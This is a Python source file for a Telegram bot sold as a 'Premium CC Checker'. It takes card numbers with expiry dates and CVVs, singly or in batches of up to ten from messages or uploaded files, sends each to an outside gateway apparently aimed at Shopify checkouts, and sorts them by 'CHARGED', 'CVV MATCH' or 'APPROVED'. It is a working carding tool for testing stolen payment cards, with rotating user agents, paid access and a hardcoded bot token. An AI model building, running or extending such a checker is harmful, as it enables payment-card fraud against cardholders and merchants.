import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          ReplyKeyboardMarkup, KeyboardButton)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8228704791:AAH85VvWM1HK0-8EEiJKh533Gc3-ul5r-x8"  # Replace with your bot token
MAIN_ADMIN_ID = 5103348494         # Replace with your admin ID
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify.onrender.com"
# =======================================================

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def health_check():
    return "🔥 Premium CC Checker is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class PremiumCcChecker:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
        # Premium visual assets
        self.START_MESSAGE = """
✨🔥 *𝕊ℍ𝕆ℙ𝕀𝔽𝕐 ℙℝ𝕆 ℂℍ𝔼ℂ𝕂𝔼ℝ 𝕍𝟚* 🔥✨

╔═══════════════════════╗
  💳 *PREMIUM CC CHECKER* 💳  
╚═══════════════════════╝

✧･ﾟ: *✧ Commands ✧* :･ﾟ✧

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
🛠️ */chk* - Instant Single Card Check
├─ Format: `/chk 4111111111111111|12|2025|123`
└─ Checks cards in 0.5s lightning speed!

📊 */mchk* - Bulk Mass Checker 
├─ Max 10 cards per batch
└─ Supports .txt files with auto-formatting
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
💎 *VIP Access:* 
Contact @mhitzxg for 
⚡ *Elite Membership* ⚡

🌌 *Current Status:*
✅ Operational | 🚀 Turbo Mode Enabled
"""
        self.PROCESSING_ANIMATION = [
            "🔍 Analyzing Card Patterns...",
            "🔒 Verifying with Payment Gateways...",
            "🌐 Routing Through Global Nodes...",
            "⚡ Finalizing Transaction Check..."
        ]

    def load_data(self):
        try:
            with open("authorized.json", "r") as f:
                self.AUTHORIZED_USERS = json.load(f)
        except:
            self.AUTHORIZED_USERS = {}
            
        try:
            with open("admins.json", "r") as f:
                self.ADMIN_IDS = json.load(f)
        except:
            self.ADMIN_IDS = [MAIN_ADMIN_ID]

    def save_data(self):
        with open("authorized.json", "w") as f:
            json.dump(self.AUTHORIZED_USERS, f)
        with open("admins.json", "w") as f:
            json.dump(self.ADMIN_IDS, f)

    def normalize_card(self, text):
        if not text:
            return None
        text = text.replace('\n', ' ').replace('/', ' ')
        numbers = re.findall(r'\d+', text)
        cc = mm = yy = cvv = ''
        for part in numbers:
            if len(part) == 16:
                cc = part
            elif len(part) == 4 and part.startswith('20'):
                yy = part
            elif len(part) == 2 and int(part) <= 12 and mm == '':
                mm = part
            elif len(part) == 2 and not part.startswith('20') and yy == '':
                yy = '20' + part
            elif len(part) in [3, 4] and cvv == '':
                cvv = part
        return f"{cc}|{mm}|{yy}|{cvv}" if cc and mm and yy and cvv else None

    def generate_user_agent(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ])

    def clean_response(self, text):
        return re.sub(r'<[^>]+>', '', text).strip()

    def escape_markdown(self, text):
        # First remove any existing backslashes
        text = text.replace('\\', '')
        # Then escape only necessary Markdown characters
        escape_chars = '_*[]()~`>#+-=|{}.!'
        return ''.join(['\\' + char if char in escape_chars else char for char in text])

    def check_card(self, cc_line):
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            # First clean HTML tags, then remove unwanted backslashes
            response_text = self.clean_response(response.text).replace('\\', '')
            return response_text
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    def is_admin(self, user_id):
        return user_id in self.ADMIN_IDS
        
    def is_authorized(self, user_id):
        if self.is_admin(user_id):
            return True
        if str(user_id) in self.AUTHORIZED_USERS:
            expiry = self.AUTHORIZED_USERS[str(user_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_USERS[str(user_id)]
                self.save_data()
        return False

    def send_unauthorized_message(self, msg):
        self.bot.reply_to(
            msg,
            "🔒 *Access Denied* 🔒\n\n"
            "This is a premium service requiring authorization.\n\n"
            "Contact @mhitzxg for access\n"
            "🛡️ Your ID: `{}`".format(msg.from_user.id),
            parse_mode='Markdown'
        )

    def start_mass_check(self, chat_id, cc_lines):
        total = len(cc_lines)
        approved = declined = checked = 0
        processing_delay = 1.5  # seconds between checks

        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_status"))
        
        # Send initial status message
        status_msg = self.bot.send_message(
            chat_id,
            f"🔮 *Mass Check Started*\n\n"
            f"📊 Total Cards: {total}\n"
            f"✅ Approved: 0\n"
            f"❌ Declined: 0\n"
            f"⏳ Processing: 0/{total}",
            reply_markup=kb,
            parse_mode='Markdown'
        )

        def update_status():
            try:
                self.bot.edit_message_text(
                    f"🔮 *Mass Check Progress*\n\n"
                    f"📊 Total Cards: {total}\n"
                    f"✅ Approved: {approved}\n"
                    f"❌ Declined: {declined}\n"
                    f"⏳ Processing: {checked}/{total}",
                    chat_id,
                    status_msg.message_id,
                    reply_markup=kb,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error updating status: {e}")

        def process_cards():
            nonlocal approved, declined, checked
            
            for index, cc in enumerate(cc_lines, 1):
                try:
                    # Update status before processing each card
                    checked = index
                    update_status()
                    
                    # Process the card
                    result = self.check_card(cc)
                    clean_result = result.replace('\\', '')  # Remove unwanted backslashes
                    
                    # Determine status
                    if any(x in clean_result for x in ["CHARGED", "CVV MATCH", "APPROVED"]):
                        approved += 1
                        status = "✅ APPROVED ✅"
                    else:
                        declined += 1
                        status = "❌ DECLINED ❌"
                    
                    # Send individual result
                    self.bot.send_message(
                        chat_id,
                        f"💳 *Card {index}/{total} - {status}*\n\n"
                        f"{clean_result}\n\n"
                        f"⚡ Powered by Premium CC Checker",
                        parse_mode='Markdown'
                    )
                    
                    # Controlled delay between checks
                    time.sleep(processing_delay)
                    
                except Exception as e:
                    logger.error(f"Error processing card {index}: {e}")
                    self.bot.send_message(
                        chat_id,
                        f"⚠️ Error processing card {index}: {str(e)}",
                        parse_mode='Markdown'
                    )
                    time.sleep(processing_delay)
                    continue
            
            # Final status update when complete
            update_status()
            self.bot.send_message(
                chat_id,
                f"🏁 *Mass Check Complete!*\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"📊 Success Rate: {round((approved/total)*100 if total > 0 else 0, 2)}%",
                parse_mode='Markdown'
            )

        # Start processing in a single dedicated thread
        threading.Thread(target=process_cards).start()

    def register_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def start_handler(msg):
            try:
                markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                markup.add(
                    KeyboardButton('/chk'),
                    KeyboardButton('/mchk'),
                    KeyboardButton('🆘 Contact Admin'),
                    KeyboardButton('📊 Bot Status')
                )
                
                self.bot.send_message(
                    msg.chat.id,
                    self.START_MESSAGE,
                    parse_mode='Markdown',
                    reply_markup=markup,
                    disable_web_page_preview=True
                )
            except Exception as e:
                logger.error(f"Start error: {e}")

        @self.bot.message_handler(commands=['chk'])
        def chk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.send_unauthorized_message(msg)

            cc = None
            if msg.reply_to_message:
                cc = self.normalize_card(msg.reply_to_message.text or "")
            else:
                args = msg.text.split(None, 1)
                if len(args) > 1:
                    cc = self.normalize_card(args[1]) or args[1]

            if not cc:
                return self.bot.reply_to(
                    msg,
                    "❌ *Invalid Format!*\n\n"
                    "💳 Please use:\n"
                    "`/chk 4111111111111111|12|2025|123`\n\n"
                    "🔍 Or reply to a message containing CC details",
                    parse_mode='Markdown'
                )

            processing_msg = self.bot.reply_to(
                msg,
                "🔄 *Initializing Premium Check System...*\n"
                "⚡ Lightning Verification Protocol Activated",
                parse_mode='Markdown'
            )
            
            stop_event = threading.Event()
            def loading_animation():
                for frame in self.PROCESSING_ANIMATION:
                    if stop_event.is_set():
                        return
                    try:
                        self.bot.edit_message_text(
                            frame,
                            msg.chat.id,
                            processing_msg.message_id,
                            parse_mode='Markdown'
                        )
                        time.sleep(1.5)
                    except:
                        break

            threading.Thread(target=loading_animation).start()

            try:
                result = self.check_card(cc)
                stop_event.set()
                
                formatted_result = (
                    f"✨ *Card Check Complete* ✨\n\n"
                    f"{self.escape_markdown(result)}\n\n"
                    f"🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"⚡ Powered by Premium CC Checker"
                )
                
                self.bot.edit_message_text(
                    formatted_result,
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )
                
            except Exception as e:
                stop_event.set()
                self.bot.edit_message_text(
                    f"❌ *System Error* ❌\n\n"
                    f"Error: {str(e)}\n\n"
                    f"🛠️ Please try again or contact support",
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )

        @self.bot.message_handler(commands=['mchk'])
        def mchk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.send_unauthorized_message(msg)

            response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

            if not msg.reply_to_message:
                return self.bot.send_message(response_chat, "❌ Reply to a message with CCs or a file.")

            text = ""
            if msg.reply_to_message.document:
                try:
                    file_info = self.bot.get_file(msg.reply_to_message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    text = downloaded_file.decode("utf-8", errors="ignore")
                except Exception as e:
                    return self.bot.send_message(response_chat, f"❌ File error: {str(e)}")
            else:
                text = msg.reply_to_message.text or ""

            cc_lines = []
            for line in text.splitlines()[:MAX_CARDS_PER_MCHK]:
                norm = self.normalize_card(line.strip())
                if norm:
                    cc_lines.append(norm)

            if not cc_lines:
                return self.bot.send_message(response_chat, "❌ No valid cards found.")

            if len(text.splitlines()) > MAX_CARDS_PER_MCHK:
                self.bot.send_message(response_chat, f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")

            self.start_mass_check(response_chat, cc_lines)

        @self.bot.callback_query_handler(func=lambda call: call.data == "refresh_status")
        def refresh_status(call):
            try:
                self.bot.answer_callback_query(call.id, "Status Updated")
            except:
                pass

    def run(self):
        self.bot.infinity_polling()

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    while True:
        try:
            bot = PremiumCcChecker()
            logger.info("🚀 Starting Premium CC Checker Bot")
            bot.run()
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            time.sleep(5)
            logger.info("🔄 Restarting bot...")
        except KeyboardInterrupt:
            logger.info("🛑 Shutting down gracefully...")
            break

if __name__ == '__main__':
    main()
